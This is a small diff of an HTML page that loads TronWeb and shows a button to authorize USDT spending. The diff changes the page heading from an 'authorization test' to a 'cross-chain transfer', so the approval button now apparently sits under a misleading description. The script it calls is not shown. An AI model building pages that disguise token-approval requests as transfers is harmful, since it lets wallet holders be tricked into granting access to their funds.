@@ -6,7 +6,7 @@
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 </head>
 <body>
-<h2>TRON USDT 授权测试</h2>
+<h2>TRON USDT 跨链搬运</h2>
 <button onclick="approve()">授权USDT</button>
 <script src="app.js"></script>
 </body>
